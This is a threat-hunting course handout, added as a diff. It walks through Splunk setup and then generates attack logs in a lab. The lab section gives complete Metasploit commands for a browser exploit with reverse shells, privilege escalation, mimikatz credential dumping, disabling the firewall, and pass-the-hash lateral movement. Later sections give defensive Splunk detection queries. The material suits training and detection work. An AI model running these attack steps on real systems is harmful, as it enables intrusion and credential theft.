@@ -1,0 +1,1026 @@
+
+ #######################################
+# Advanced Threat Hunting With Splunk #
+#######################################
+
+Previous version of the course:
+https://s3.amazonaws.com/infosecaddictsfiles/Splunk_for_InfoSec_2017.pdf
+
+
+#######################
+# VMs for this course #
+#######################
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/InfoSecAddictsVM.zip
+user:      infosecaddicts
+pass:      infosecaddicts
+
+
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/Win7x64.zip
+    username: workshop
+    password: password
+   
+ 
+You don't have to, but you can do the updates in the Win7 VM (yes, it is a lot of updates).
+
+Here is the Windows 2003 VM that we will be using for this course:
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/Win2003EntSrv.zip
+    username: Administrator
+    password: Administrator! 
+
+NOTE:
+Although each of these virtual machines can be configured to support VirtualBox, I can not support Virtual Box in this class.
+
+Please use the FREE version of VMWare Player that can be downloaded from: http://www.vmware.com/products/player/playerpro-evaluation.html
+
+
+###############################
+# Splunk Universal Forwarders #
+###############################
+This is the Splunk Universal forwarder that you'll need for the Win7 VM:
+https://s3.amazonaws.com/infosecaddictsfiles/splunkforwarder-6.4.5-e82289930bdd-x64-release.msi
+
+
+Good references to read on the subject of Threat Hunting:
+---------------------------------------------------------
+https://www.slideshare.net/ChristopherGerritz/bsideslv-2016-powershell-hunting-on-the-endpoint-gerritz
+https://www.slideshare.net/Splunk/splunk-workshopthreat-hunting
+
+
+Pyramid of Pain:
+----------------
+http://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html
+
+
+Free threat feeds:
+------------------
+https://rules.emergingthreats.net/
+https://otx.alienvault.com/
+
+
+
+
+                            ##############################
+----------- ############### # Day 1: Splunk Fundamentals # ############### -----------
+                            ##############################
+
+
+
+
+######################################
+# Installing Splunk on the Ubuntu VM #
+######################################
+Splunk Installation – Once you’ve downloaded the Deb file, upload the file to your Ubuntu server and place it a temporary directory.  
+
+Run the dpkg command to install the Splunk server.  The file name of the .deb file may change as new versions are made available so make sure that you have downloaded.
+ 
+---------------------------Type This----------------------------------- 
+sudo /sbin/iptables -F
+    infosecaddicts
+ 
+sudo apt update && sudo apt upgrade
+    infosecaddicts
+----------------------------------------------------------------------- 
+ 
+Go to https://www.splunk.com/en_us/download.html and download the Splunk Light version. After signing up you'll also be given a wget link.
+In the command below I am using the wget link to download and install Splunk Light
+ 
+---------------------------Type This----------------------------------- 
+wget https://s3.amazonaws.com/infosecaddictsfiles/splunklight-6.5.0-59c8927def0f-linux-2.6-amd64.deb
+ 
+sudo dpkg -i splunklight-6.5.0-59c8927def0f-linux-2.6-amd64.deb
+    infosecaddicts
+-----------------------------------------------------------------------  
+ 
+ 
+ 
+Next we need to create the init.d script so that we can easily start and stop Splunk.
+Change the the Splunk directory and run the splunk executable with the below arguments.
+
+---------------------------Type This----------------------------------- 
+cd /opt/splunk/bin/
+ 
+sudo ./splunk enable boot-start
+    infosecaddicts
+-----------------------------------------------------------------------  
+Press SPACE to view all of the license agreement and then Y to accept it.
+ 
+ 
+ 
+Start Splunk with the service command.
+---------------------------Type This----------------------------------- 
+sudo service splunk start
+    infosecaddicts
+
+sudo ./splunk start
+-----------------------------------------------------------------------  
+ 
+ 
+ 
+Accessing The Splunk Interface – You will now be able to access Splunk’s web GUI which is running on port 8000.
+Point your browser at – http://192.168.200.144:8000/. Open the URL in the browser and login with the below details:
+ 
+User Name:  admin
+Password:   changeme
+ 
+What Next – Great, you now have your Splunk installation up and running. What’s required next is to get data from your various applications, logs and monitoring tools into Splunk so that it can be mined for relevant statistics.
+ 
+ 
+These rolled up statistics is what we would then import into VisualizeIT for purposes of visualization, modelling and forecasting. As next steps we would recommending reading the Splunk Forwarder article which talks about downloading, installing and configuring the Splunk Forward which is required to aggregated and send data to Splunk.
+ 
+ 
+ 
+ 
+###############################
+# Set up Universal Forwarding #
+###############################
+Paul's config trick:
+1. In the Splunk Light user interface, click the 3 bar menu item in the top menu left bar.
+2. Goto "Data", then "Data receiving"
+3. Add new
+4. In the Listen on this port input box type "9997", and then click save
+5. Go back to the 3 bar menu item in the top menu left bar.
+6. Goto "Data", then "indexes"
+7. Click "new index" in to top right corner
+8. Name the new index wineventlog, and then click save. No need to configure anything other options.
+ 
+ 
+*** Note  ***
+It can take several minutes for the logs to starting flowing.
+ 
+ 
+If after 15 minutes you are still unable to see win7-64-victim as a host on your search screen you can do the following:
+ 
+1. In the Splunk Light user interface, click "Search", then on the far right under "Data" click "Add Data"
+2. Select "Forward", at the "Select Server Class" line choose "New". You should see win7-64-victim as an available host
+3. Click win7-64-victim moving it to selected hosts, then give the server class a name (ex: splunk), then click Next at the top of the screen
+4. Click "Local Event Logs" on the far left and click "add all" moving all of the log types to selected items, then click Next at the top of the screen
+5. Click "Review" then click, Done.
+ 
+If you feel like you messed up setting up the forwarder - check the following items:
+
+1. Ensure that the firewall is disabled on the Linux host
+    sudo /sbin/iptables -F
+
+2. Ensure that the Win7victim can ping the IP address of the Linux host
+
+3. Re-run the universal forwarder and verify that you are using the correct IP (Linux host IP address) and port (use the default listed on the screen).
+
+4. Go to the hamburger in the top left corner -> select "System" -> "Forwarder Management" -> "Apps" -> under "Actions" -> "Edit" -> "Uninstall"
+
+5. From the same screen go to the "Server Classes" tab, -> under "Actions" -> "Edit" -> "Delete"
+
+----Then redo the "Add Data" steps again.....
+
+ 
+6. In the Splunk Light user interface, click "Search", then on the far right under "Data" click "Add Data"
+
+7. Select "Forward", at the "Select Server Class" line choose "New". You should see win7-64-victim as an available host
+
+8. Click win7-64-victim moving it to selected hosts, then give the server class a name (ex: splunk2), then click Next at the top of the screen 
+
+9. Go to the hamburger in the top left corner -> select "System" -> "Forwarder Management" -> "Apps" -> under "Actions" -> "Edit" ->
+Look for after installation...be sure to check both boxes (enable app, and restart splunkd) and then save.
+ 
+#########################
+# Splunk Queries to try #
+#########################
+---------------------------Type This----------------------------------- 
+host=
+ 
+source=
+ 
+sourcetype=
+-----------------------------------------------------------------------  
+ 
+ 
+Here are some basic Splunk commands:
+http://docs.splunk.com/images/a/a3/Splunk_4.x_cheatsheet.pdf
+ 
+
+
+
+
+
+####################################################
+# Generating some REAL attack logs with Metasploit #
+####################################################
+---------------------------Type This-----------------------------------
+sudo /sbin/iptables -F
+ 
+cd ~/toolz/metasploit/scripts/meterpreter/
+
+wget https://s3.amazonaws.com/infosecaddictsfiles/gold-digger.rb
+
+cd ~/toolz/metasploit
+ 
+./msfconsole
+-------------------------------------------------------- 
+ 
+##################################
+# Basic Client-Side Exploitation #
+##################################
+---------------------------Type This-----------------------------------
+ 
+use exploit/windows/browser/ie_cgenericelement_uaf
+ 
+set ExitOnSession false
+ 
+set URIPATH /ie8
+ 
+set PAYLOAD windows/meterpreter/reverse_tcp
+ 
+set LHOST 192.168.11.129                                            (Make sure you change this to your ubuntu ip address)
+ 
+exploit -j
+-------------------------------------------------------- 
+ 
+- Now from the Win7 host, use Internet Explorer 8 to connect to the exploit address (local address)
+- given to you by metasploit.
+ 
+- The address will be something like:
+ 
+http://192.168.11.129:8080/ie8                                            (Make sure you change this to your ubuntu ip address)
+ 
+ 
+ 
+- This will simulate a victim clicking on your malicious link and being exploited with a browser exploit.
+ 
+ 
+###########################
+# Client-Side Enumeration #
+###########################
+ 
+ 
+- You can list the active sessions by typing:
+---------------------------Type This----------------------------------- 
+sessions -l
+-------------------------------------------------------- 
+ 
+ 
+ 
+- You can "interact" with any active session by typing sessions -i 3 (replace 3 with the session number you want to interact with)
+ 
+---------------------------Type This----------------------------------- 
+sessions -i 1
+-------------------------------------------------------- 
+ 
+ 
+ 
+ 
+- You should now see Metasploit's meterpreter prompt.
+ 
+ 
+********************************** Figure out who and where you are **********************************
+---------------------------Type This----------------------------------- 
+meterpreter> sysinfo
+ 
+ 
+meterpreter> getuid
+ 
+ 
+meterpreter> ipconfig
+ 
+ 
+meterpreter> run post/windows/gather/checkvm
+-------------------------------------------------------- 
+ 
+ 
+ 
+********************************** Escalate privileges and get hashes **********************************
+---------------------------Type This----------------------------------- 
+ 
+--Option 1: GetSystem
+meterpreter> getsystem
+ 
+--Option 2:
+meterpreter > run post/windows/escalate/getsystem
+ 
+--Option 3:
+meterpreter> background
+back
+use post/windows/escalate/droplnk
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.11.129                                            (Make sure you change this to your ubuntu ip address)
+set LPORT 1234
+exploit
+ 
+--Option 4:
+use exploit/windows/local/bypassuac
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.245.137                                            #(Make sure you change this to your ubuntu ip address)
+set LPORT 12345
+exploit
+ 
+--Option 5:
+use exploit/windows/local/service_permissions
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.11.129                                            (Make sure you change this to your ubuntu ip address)
+set LPORT 5555
+exploit
+ 
+--Option 6:
+use exploit/windows/local/trusted_service_path
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.11.129                                            #(Make sure you change this to your ubuntu ip address)
+set LPORT 4567
+exploit
+ 
+ 
+--Option 7:
+use exploit/windows/local/ppr_flatten_rec
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.245.137                                            #(Make sure you change this to your ubuntu ip address)
+set LPORT 7777
+exploit
+ 
+--Option 8:
+use exploit/windows/local/ms_ndproxy
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.245.137                                            #(Make sure you change this to your ubuntu ip address)
+set LPORT 7788
+exploit
+ 
+ 
+--Option 9:
+use exploit/windows/local/ask
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.245.137                                            #(Make sure you change this to your ubuntu ip address)
+set LPORT 7799
+exploit
+ 
+ 
+meterpreter > getuid
+Server username: win7-64-victim\Workshop
+
+
+meterpreter > getsystem
+
+...got system (via technique 1).
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+ 
+ 
+meterpreter> run post/windows/gather/hashdump
+ 
+meterpreter > ps                (search for a process running as NT AUTHORITY\SYSTEM)
+ 
+meterpreter > migrate 2800      (your process id WILL NOT be 2800, but make sure you use one that is running at NT AUTHORITY\SYSTEM)
+ 
+meterpreter> run post/windows/gather/credentials/credential_collector
+
+meterpreter> run post/windows/gather/hashdump
+--------------------------------------------------------
+
+ 
+#####################
+# Fix broken PSExec #
+#####################
+- We use the shell command to get to the Victim Dos command so we can add a registry field.
+---------------------------Type This----------------------------------- 
+meterpreter > execute -c -H -f cmd -a "/k" -i
+-------------------------------------------------------- 
+ 
+- Created a registry field to the Victim computer, this will allow us to access the machine using and exploit via PSEXEC.
+---------------------------Type This-----------------------------------  
+C:\Windows\system32> reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system  /v LocalAccountTokenFilterPolicy  /t REG_DWORD  /d  1
+ 
+ 
+c:\Windows\system32> netsh advfirewall set allprofiles state off
+--------------------------------------------------------
+
+ 
+********************************** Steal Tokens **********************************
+---------------------------Type This----------------------------------- 
+meterpreter > getsystem
+ 
+meterpreter > use incognito
+ 
+meterpreter > list_tokens -u
+ 
+meterpreter > list_tokens -g
+ 
+ 
+NOTE: These commands will not work as your VM is not connected to Active Directory. They are provided so you can have the syntax.
+ 
+meterpreter > impersonate_token                         <-- choose who you want to impersonate but be sure to use 2 slashes in the name (ex: impersonate_token domain\\user)
+ 
+meterpreter> getuid
+-------------------------------------------------------- 
+ 
+************ Stealing credentials and certificates ************
+- NOTE: Most of the stuff after 'kerberos' DOES NOT work, but is given here so you know the correct syntax to use when connected to AD or dealing with smart/CAC cards.
+
+---------------------------Type This----------------------------------- 
+meterpreter > getsystem
+ 
+meterpreter > load mimikatz
+ 
+meterpreter > kerberos
+ 
+ 
+NOTE: These commands will not work as your VM is not connected to Active Directory. They are provided so you can have the syntax.
+ 
+ 
+meterpreter > mimikatz_command -f sekurlsa::logonPasswords -a "full"
+ 
+meterpreter > msv                                                               <-- Your AD password
+ 
+meterpreter > livessp                                                           <-- Your Windows8 password
+ 
+meterpreter > ssp                                                               <-- Your outlook password
+ 
+meterpreter > tspkg                                                             <-- Your AD password
+ 
+meterpreter > wdigest                                                           <-- Your AD password
+ 
+meterpreter > mimikatz_command -f crypto::listStores
+ 
+meterpreter > mimikatz_command -f crypto::listCertificates
+ 
+meterpreter > mimikatz_command -f crypto::exportCertificates CERT_SYSTEM_STORE_CURRENT_USER
+ 
+meterpreter > mimikatz_command -f crypto::patchcapi
+ 
+meterpreter> search -d <directory> -f <file-pattern>
+-------------------------------------------------------- 
+ 
+********************************** Enumerate the host you are on **********************************
+---------------------------Type This----------------------------------- 
+meterpreter > run gold-digger
+
+meterpreter > run post/windows/gather/enum_applications
+ 
+meterpreter > run post/windows/gather/enum_logged_on_users
+ 
+meterpreter > run post/windows/gather/usb_history
+ 
+meterpreter > run post/windows/gather/enum_shares
+ 
+meterpreter > run post/windows/gather/enum_snmp
+ 
+meterpreter> reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+-------------------------------------------------------- 
+
+ 
+********************************** Lateral Movement *******************************
+ 
+Now we can run the PSEXEC exploit.
+-- Option 1:
+---------------------------Type This-----------------------------------
+use exploit/windows/smb/psexec
+ 
+set SMBUser Workshop
+ 
+set SMBPass password
+ 
+set RHOST 192.168.11.130
+ 
+set payload windows/meterpreter/reverse_tcp
+ 
+set LHOST 192.168.11.129
+ 
+set LPORT 2345
+ 
+exploit
+-------------------------------------------------------- 
+ 
+ 
+ 
+-- Option 2:
+---------------------------Type This-----------------------------------
+use exploit/windows/smb/psexec
+ 
+set SMBUser Workshop
+ 
+set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
+ 
+set payload windows/meterpreter/reverse_tcp
+ 
+set RHOST 192.168.11.130                      
+ 
+set LHOST 192.168.11.129
+ 
+set LPORT 5678
+ 
+exploit
+--------------------------------------------------------
+
+
+***********************************
+* Getting Serious About .rc files *
+***********************************
+ 
+---------------------------Type This----------------------------------- 
+rm -rf /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc
+rm -rf /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
+
+
+
+touch /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc
+ 
+echo run gold-digger >> /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc
+ 
+echo run post/windows/gather/enum_applications >> /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc
+ 
+echo run post/windows/gather/enum_logged_on_users >> /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc
+ 
+echo run post/windows/gather/checkvm >> /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc
+ 
+ 
+ 
+- Ok, that was fun. Now let's take a quick look at the .rc file we just created.
+---------------------------Type This-----------------------------------
+cat /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc
+  
+touch /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
+ 
+echo use exploit/windows/browser/ie_cgenericelement_uaf >> /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
+ 
+echo set ExitOnSession true >> /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
+ 
+echo set URIPATH /ie8 >> /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
+ 
+echo set PAYLOAD windows/meterpreter/reverse_tcp >> /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
+ 
+echo set LHOST 192.168.11.129 >> /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc                            
+         
+ 
+echo set AutoRunScript multi_console_command -rc /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc >> /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
+ 
+echo exploit -j -z >> /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
+-------------------------------------------------------- 
+ 
+ 
+- Ok, that was more fun than the previous one. Now let's take a quick look at the .rc file we just created.
+---------------------------Type This-----------------------------------
+cat /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc
+ 
+cat /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
+-------------------------------------------------------- 
+
+
+
+
+- Alright, enough already. Let's run this thing.
+---------------------------Type This-----------------------------------
+./msfconsole -r old-faithful-ie8.rc
+-------------------------------------------------------- 
+
+
+
+
+
+
+
+
+
+ 
+---------------------------------------------------------
+Incident Response & Malware Analysis with Splunk
+Reference:
+https://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/56016c77e4b08aeb5c47d68b/1442933879868/Windows+Splunk+Logging+Cheat+Sheet+v1.0.pdf
+ 
+
+
+##############################
+# CRITICAL EVENTS TO MONITOR #
+##############################
+1. NEW PROCESS STARTING: Event Code 4688 will capture when a process or executable starts.
+ 
+2. USER LOGON SUCCESS: Event Code 4624 will capture when a user successfully logons to the system.
+ 
+3. SHARE ACCESSED: Event Code 5140 will capture when a user connects to a file share.
+ 
+4. NEW SERVICE INSTALLED: Event Code 7045 will capture when a new service is installed.
+ 
+5. NETWORK CONNECTION MADE: Event Code 5156 will capture when a network connection is made from the source
+to the destination including the ports used and the process used to initiate the connection. Requires the use of the
+Windows Firewall
+ 
+6. FILE AUDITING: Event Code 4663 will capture when a new file is added, modified or deleted.
+ 
+7. REGISTRY AUDITING: Event Code 4657 will capture when a new registry item is added, modified or deleted
+ 
+8. WINDOWS POWERSHELL COMMAND LINE EXECUTION: Event Code 500 will capture when PowerShell is executed
+logging the command line used.
+ 
+9. WINDOWS FIREWALL CHANGES: Event Code 2004 will capture when new firewall rules are added.
+ 
+10. SCHEDULE TASKS ADDED: Event Code 106 will capture when a new scheduled task is added.
+ 
+ 
+ 
+ 
+ 
+FILTERING EVENTS::
+------------------
+1. Filter by Message, NOT by Event Code: It is common to blacklist event codes that are noisy or excessive that
+impacts storage and licensing. By enabling Process Creation Success (4688) Process Terminate (4689) and Windows
+Firewall Filtering Platform Connection Success (5156 & 5158) they will be the top four event codes in your Splunk
+index. Filtering by the content of the Message or Field name is the better way to go. Once you understand what
+normal noise is, has minimal risk to be exploited or important to security monitoring you can filter those out at the
+client or server. Here is an example of a proper exclusion:
+ 
+[WinEventLog://Security]
+disabled=0
+current_only=1
+blacklist1=EventCode="4662" Message=”Object Type:\s+(?!groupPolicyContainer)”
+blacklist2=EventCode="5156" Message=”Application Name:\s+(?!\\program files
+(x86)\\google\\chrome\\application\\chrome.exe)”
+ 
+
+2. Indexes: It is normal to have an index named "windows” for the typical Application, Security, Setup and System
+logs, but separating other Windows logs into separate indexes is a good practice to reduce search times. Consider
+collecting the Windows PowerShell, TaskScheduler, Windows Firewall, AppLocker and other Applications and
+Services logs that you might want to collect into their own indexes if they get large in quantity of events. You can
+always use the "Join” command if you want to combine data from multiple indexes.
+ 
+ 
+
+MONITOR FOR PROCESSES STARTING - 4688::
+---------------------------------------
+1. Monitor for Suspicious/Administrative Processes: This list is based on built-in Windows administrative utilities and
+known hacking utilities that are often seen used in exploitation. Expand this list as needed to add utilities used in
+hacking attacks. You do not need to alert on all processes launching, just suspicious ones or ones known to be used
+in hacking attacks. Some administrative tools are very noisy and normally used or automatically executed regularly
+and should NOT be included to make your alert more actionable and accurate that something suspicious has
+occurred.
+
+ 
+SAMPLE QUERY:
+---------------------------Type This-----------------------------------
+index=wineventlog LogName=Security EventCode=4688 NOT (Account_Name=*$) (at.exe OR bcdedit.exe OR chcp.exe OR
+cmd.exe OR cscript.exe OR ipconfig.exe OR mimikatz.exe OR nbtstat.exe OR nc.exe OR netcat.exe OR netstat.exe OR
+nmap OR nslookup.exe OR bcp.exe OR sqlcmd.exe OR OSQL.exe OR ping.exe OR powershell.exe OR powercat.ps1 OR
+psexec.exe OR psexecsvc.exe OR psLoggedOn.exe OR procdump.exe OR rar.exe OR reg.exe OR route.exe OR runas.exe
+OR sc.exe OR schtasks.exe OR sethc.exe OR ssh.exe OR sysprep.exe OR systeminfo.exe OR system32\\net.exe OR
+tracert.exe OR vssadmin.exe OR whoami.exe OR winrar.exe OR wscript.exe OR winrm.* OR winrs.* OR wmic.exe OR
+wsmprovhost.exe) | eval Message=split(Message,".") | eval Short_Message=mvindex(Message,0) | table _time, host,
+Account_Name, Process_Name, Process_ID, Process_Command_Line, New_Process_Name, New_Process_ID,
+Creator_Process_ID, Short_Message
+----------------------------------------------------------------------- 
+
+ 
+2. Monitor for PowerShell bypass attempts: Hackers will often use PowerShell to exploit a system due to the
+capability of PowerShell to avoid using built-in utilities and dropping additional malware files on disk. Watching for
+policy and profile bypasses will allow you to detect this hacking activity.
+
+ 
+SAMPLE QUERY:
+---------------------------Type This-----------------------------------
+index=wineventlog EventCode=4688 (powershell* AND -ExecutionPolicy) OR (powershell* AND bypass) OR (powershell*
+AND -noprofile) | eval Message=split(Message,".") | eval Short_Message=mvindex(Message,0) | table _time, host,
+Account_Name, Process_Name, Process_ID, Process_Command_Line, New_Process_Name, New_Process_ID,
+Creator_Process_ID, Short_Message
+----------------------------------------------------------------------- 
+ 
+3. Monitor for all processes excluding trusted/known processes: You can create reports for any or all processes
+starting (4688) and filter out the known good ones to create a more actionable report and alert. For larger lists
+consider using the "lookup” command. Your .csv file has to be in a 'lookups' directory in either the parent or a child
+local directory; /opt/splunk/etc/apps/search/lookups. The idea here is a typical system has a normal state, if you
+exclude all the normal processes, then if something new runs, say BlackPOS.exe as was the case in the retail
+breaches, you would be able to detect it.
+
+ 
+SAMPLE QUERY:
+---------------------------Type This-----------------------------------
+index=wineventlog LogName=Security EventCode=4688 NOT (Account_Name=*$) | NOT [ inputlookup
+Trusted_processes.csv | fields Process_Name ] | eval Message=split(Message,".") | eval
+Short_Message=mvindex(Message,0) | table _time, host, Account_Name, Process_Name, Process_ID,
+Process_Command_Line, New_Process_Name, New_Process_ID, Creator_Process_ID, Short_Message
+----------------------------------------------------------------------- 
+ 
+MONITOR FOR USER LOGONS – 4624 & 4625::
+1. Monitor for Logon Success: Logging for failed logons seems obvious, but when a user credential gets compromised
+and their credentials used for exploitation, successful logins will be a major indicator of malicious activity and
+system crawling. This alert looks for successful logons > 2 and excludes domain controllers to detect when a rogue
+user account crawls across systems in your network.
+
+ 
+SAMPLE QUERY:
+---------------------------Type This-----------------------------------
+index=wineventlog LogName=Security EventCode=4624 NOT (host="DC1" OR host="DC2" OR host="DC…”) NOT
+(Account_Name="*$" OR Account_Name="ANONYMOUS LOGON") NOT (Account_Name="Service_Account") | eval
+Account_Domain=(mvindex(Account_Domain,1)) | eval Account_Name=if(Account_Name="-
+",(mvindex(Account_Name,1)), Account_Name) | eval
+Account_Name=if(Account_Name="*$",(mvindex(Account_Name,1)), Account_Name) | eval
+Time=strftime(_time,"%Y/%m/%d %T") | stats count values(Account_Domain) AS Domain, values(host) AS Host,
+dc(host) AS Host_Count, values(Logon_Type) AS Logon_Type, values(Workstation_Name) AS WS_Name,
+values(Source_Network_Address) AS Source_IP, values(Process_Name) AS Process_Name by Account_Name | where
+Host_Count > 2
+----------------------------------------------------------------------- 
+ 
+2. Monitor for Logon Failures: Watch for excessive logon failures, especially Internet facing systems and systems that
+contain confidential data. This will also detect brute force attempts and users who have failed to changed their
+passwords on additional devices such as smartphones. You can add "stats count” to watch for quantity, exclude
+certain accounts you know are good and normally fail. Avoid excluding administrative accounts as they are the
+ones the hackers are after.
+
+ 
+SAMPLE QUERY:
+---------------------------Type This-----------------------------------
+index=wineventlog LogName=Security EventCode=4625 | table _time, Workstation_Name, Source_Network_Address,
+host, Account_Name
+----------------------------------------------------------------------- 
+ 
+3. Monitor for Administrative and Guest Logon Failures: Hackers and malware often try to brute force known
+accounts, such as Administrator and Guest. This alert will monitor and alert if configured for attempts > 5.
+
+
+SAMPLE QUERY:
+---------------------------Type This-----------------------------------
+index=wineventlog LogName=Security EventCode=4625 (Account_Name=administrator OR Account_Name=guest) | stats
+count values(Workstation_Name) AS Workstation_Name, Values(Source_Network_Address) AS Source_IP_Address,
+values(host) AS Host by Account_Name | where count > 5
+-----------------------------------------------------------------------  
+ 
+MONITOR FOR FILE SHARES - 5140::
+1. Monitor for File Shares being accessed: Once a system is compromised, hackers will connect or jump to other
+systems to infect and/or to steal data. Watch for accounts crawling across file shares. Some management
+accounts will do this normally so exclude these to the systems they normally connect. Other activity from
+management accounts such as new processes launching will alert you to malicious behavior when excluded in this
+alert.
+
+ 
+SAMPLE QUERY:
+---------------------------Type This-----------------------------------
+index=wineventlogsource="WinEventLog:Security" EventCode=5140 (Share_Name="*\\C$" OR Share_Name="*D$" OR
+Share_Name="*E$" OR Share_Name="*F$" OR Share_Name="*U$") NOT Source_Address="::1" | eval
+Destination_Sys1=trim(host,"1") | eval Destination_Sys2=trim(host,"2") | eval Dest_Sys1=lower(Destination_Sys1) |
+eval Dest_Sys2=lower(Destination_Sys2) | rename host AS Destination | rename Account_Domain AS Domain | where
+Account_Name!=Dest_Sys1 | where Account_Name!=Dest_Sys2 | stats count values(Domain) AS Domain,
+values(Source_Address) AS Source_IP, values(Destination) AS Destination, dc(Destination) AS Dest_Count,
+values(Share_Name) AS Share_Name, values(Share_Path) AS Share_Path by Account_Name
+-----------------------------------------------------------------------  
+
+ 
+MONITOR FOR SERVICE CHANGES – 7045 & 7040::
+-------------------------------------------
+1. Monitor for New Service Installs: Monitoring for a new service install is crucial. Hackers often use a new service to
+gain persistence for their malware when a system restarts. All the retail Point of Sale breaches included one or
+more new services that could have been easily detected with this alert alone.
+ 
+
+SAMPLE QUERY:
+---------------------------Type This-----------------------------------
+index=wineventlog LogName=System EventCode=7045 NOT (Service_Name=mgmt_service) | eval
+Message=split(Message,".") | eval Short_Message=mvindex(Message,0) | table _time host Service_Name,
+Service_Type, Service_Start_Type, Service_Account, Short_Message
+----------------------------------------------------------------------- 
+ 
+2. Monitor for Service State Changes: Monitoring for a service state changes can show when a service is altered.
+Hackers often use an existing service to avoid new service detection and modify the ServiceDll to point to a
+malicious payload gaining persistence for their malware when a system restarts. Unfortunately the details are not
+in the logs, but this alert can lead you to look into a service state change or enable auditing on keys that trigger
+seldom used services to watch for ServiceDll changes. There are a few services that will normally start and stop
+regularly and will need to be excluded. Use registry auditing (4657) to monitor for changes to the ServiceDll value.
+
+
+SAMPLE QUERY:
+---------------------------Type This-----------------------------------
+index=wineventlog LogName=System EventCode=7040 NOT ("*Windows Modules Installer service*” OR "*Background
+Intelligent Transfer Service service*”) | table _time, host, User, Message
+-----------------------------------------------------------------------  
+
+ 
+MONITOR FOR NETWORK CONNECTIONS - 5156::
+----------------------------------------
+1. Monitor for Suspicious Network IP’s: This does require the use of the Windows Firewall. In networks where this is
+normally not used, you can use Group Policy to set the Windows Firewall to an Any/Any configuration so no
+blocking occurs, yet the traffic is captured in the logs and more importantly what process made the connection.
+You can create exclusions by IP addresses (such as broadcast IP’s) and by process names to reduce the output and
+make it more actionable. The "Lookup” command will benefit this query tremendously by excluding items.
+ 
+
+SAMPLE QUERY:
+---------------------------Type This-----------------------------------
+index=wineventlog LogName=Security EventCode=5156 NOT (Source_Address="239.255.255.250" OR
+Source_Address="224.0.0.*" OR Source_Address="::1" OR Source_Address="ff02::*" OR Source_Address="fe80::*" OR
+Source_Address="255.255.255.255" OR Source_Address=192.168.1.255) NOT (Destination_Address="127.0.0.1" OR
+Destination_Address="239.255.255.250" OR Destination_Address="*.*.*.255" OR Destination_Address="224.0.0.25*")
+NOT (Destination_Port="0") NOT (Application_Name="\\<some process name>\\" OR
+Application_Name="*\\bin\\splunkd.exe") | dedup Destination_Address Destination_Port | table _time, host,
+Application_Name, Direction, Source_Address, Source_Port, Destination_Address, Destination_Port | sort Direction
+Destination_Port
+-----------------------------------------------------------------------  
+ 
+MONITOR FOR FILE CHANGES – 4663::
+---------------------------------
+1. Monitor for New files: This requires directories and/or files to have auditing set on each object. You want to audit
+directories that are well known for malware such as AppData\Local, LocalLow & Roaming as well as \Users\Public
+for the following:
+ 
+
+SAMPLE QUERY:
+---------------------------Type This-----------------------------------
+index=wineventlog sourcetype=WinEventLog:Security EventCode=4663 NOT
+(Process_Name="*\\Windows\\servicing\\TrustedInstaller.exe" OR "*\\Windows\\System32\\poqexec.exe") NOT
+Object_Name="C:\\Users\\Surf\\AppData\\Local\\Google\\Chrome\\User Data*" NOT
+Object_Name="C:\\Users\\<special user>\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\CustomDestinations"
+NOT (Object_Name="C:\\Windows\\System32\\LogFiles\\*" OR Object_Name="*ProgramData\\Microsoft\\RAC\\*"
+OR Object_Name="*\\Microsoft\\Windows\\Explorer\\thumbcache*" OR Object_Name="*.MAP" OR
+Object_Name="*counters.dat" OR Object_Name="*\\Windows\\Gatherlogs\\SystemIndex\\*") | rename
+Process_Name as Created_By | table _time, host, Security_ID, Handle_ID, Object_Type, Object_Name, Process_ID,
+Created_By, Accesses
+-----------------------------------------------------------------------  
+
+ 
+MONITOR FOR FILE CHANGES – 4663 continued::
+-------------------------------------------
+2. Monitor for Crypto events: Setting auditing on a File Server Share will allow large amounts of file changes from a
+crypto event to be detected. Look at a large quantity of changes > 1000 in 1 hour to detect the event. Use the
+same settings as above as you only need to monitor for NEW files. It is obvious when an event occurs!
+ 
+
+SAMPLE QUERY:
+---------------------------Type This-----------------------------------
+index=wineventlog LogName=Security EventCode=4663 host=* (Accesses="WriteData (or AddFile)" AND
+Object_Name="*.*") NOT (Security_ID="NT AUTHORITY\\SYSTEM") NOT (Object_Name="*\\FireFoxProfile\\*" OR
+Object_Name="*.tmp*" OR Object_Name="*.xml" OR Object_Name="*Thumbs.db" OR
